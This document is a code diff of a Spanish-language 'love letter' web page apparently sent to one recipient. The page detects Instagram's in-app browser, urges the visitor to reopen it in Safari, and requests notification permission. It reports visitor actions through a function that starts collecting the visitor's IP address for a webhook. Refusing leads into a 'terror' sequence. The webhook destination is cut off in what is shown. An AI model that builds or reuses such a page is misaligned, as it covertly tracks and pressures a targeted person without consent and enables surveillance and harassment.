@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 
-<!-- OPEN GRAPH PARA INSTAGRAM -->
 <meta property="og:title" content="churri">
 <meta property="og:description" content="im so churri">
 <meta property="og:image" content="https://thumbs.dreamstime.com/b/un-lindo-gato-llorando-una-linda-gata-de-triste-cara-caricatura-kawaii-personaje-animales-compa%C3%B1%C3%ADa-emoci%C3%B3n-gatito-con-coraz%C3%B3n-341622757.jpg">
@@ -29,7 +28,6 @@ body {
     overflow: hidden;
 }
 
-/* ---------- GENERALES ---------- */
 .center {
     position: fixed;
     inset: 0;
@@ -41,10 +39,7 @@ body {
     flex-direction: column;
 }
 
-/* ---------- START ---------- */
-#startScreen {
-    cursor: pointer;
-}
+#startScreen { cursor: pointer; }
 
 #startText {
     font-size: 1.4rem;
@@ -52,11 +47,8 @@ body {
     animation: fadeIn 2s ease forwards;
 }
 
-@keyframes fadeIn {
-    to { opacity: 1; }
-}
+@keyframes fadeIn { to { opacity: 1; } }
 
-/* ---------- CONTENIDO ---------- */
 #content {
     display: none;
     height: 100vh;
@@ -129,17 +121,18 @@ body {
 <audio id="finalAudio" src="audio.mp3"></audio>
 
 <script>
-/* ---------- DETECCIÓN ---------- */
 const ua = navigator.userAgent;
 const isInstagram = ua.includes("Instagram");
 const isStandalone =
     window.navigator.standalone === true ||
     window.matchMedia('(display-mode: standalone)').matches;
 
-/* ---------- ELEMENTOS ---------- */
 const message = document.getElementById("message");
 const startScreen = document.getElementById("startScreen");
 const content = document.getElementById("content");
+
+const bgAudio = document.getElementById("bgAudio");
+const finalAudio = document.getElementById("finalAudio");
 
 const mensajesNo = [
     "¿Segura? 😢",
@@ -148,15 +141,6 @@ const mensajesNo = [
     "Mi corazón no aguanta 😔"
 ];
 
-const bgAudio = document.getElementById("bgAudio");
-const finalAudio = document.getElementById("finalAudio");
-
-/* ---------- NOTIFICACIONES ---------- */
-if ("Notification" in window && Notification.permission !== "granted") {
-    Notification.requestPermission();
-}
-
-/* ---------- FLUJO PRINCIPAL ---------- */
 if (isInstagram) {
     mostrarMensaje("Hola princesita, necesito que abras esto desde Safari.");
     enviarWebhook("instagram");
@@ -170,7 +154,6 @@ else {
     iniciarExperiencia();
 }
 
-/* ---------- FUNCIONES ---------- */
 function mostrarMensaje(texto) {
     message.textContent = texto;
     message.style.display = "flex";
@@ -183,21 +166,13 @@ function iniciarExperiencia() {
         startScreen.style.display = "none";
         content.style.display = "flex";
 
-        // 🔓 DESBLOQUEO DE AUDIOS (ÚNICO CAMBIO)
-        bgAudio.volume = 0;
-        finalAudio.volume = 0;
+        // ✅ PERMISOS (iOS CORRECTO)
+        if ("Notification" in window && Notification.permission !== "granted") {
+            Notification.requestPermission();
+        }
 
-        bgAudio.play().then(() => {
-            bgAudio.pause();
-            bgAudio.currentTime = 0;
-            bgAudio.volume = 1;
-        }).catch(()=>{});
-
-        finalAudio.play().then(() => {
-            finalAudio.pause();
-            finalAudio.currentTime = 0;
-            finalAudio.volume = 1;
-        }).catch(()=>{});
+        // ✅ AUDIO (iOS CORRECTO)
+        bgAudio.play().catch(()=>{});
 
         crearCarta();
     });
@@ -213,8 +188,6 @@ function crearCarta() {
             </div>
         </div>
     `;
-
-    bgAudio.play().catch(()=>{});
 
     document.getElementById("noBtn").onclick = () => {
         if (Notification.permission === "granted") {
@@ -273,7 +246,6 @@ function flujoTerror() {
     render();
 }
 
-/* ---------- WEBHOOK ---------- */
 async function enviarWebhook(accion) {
     let ip = "desconocida";
     try {
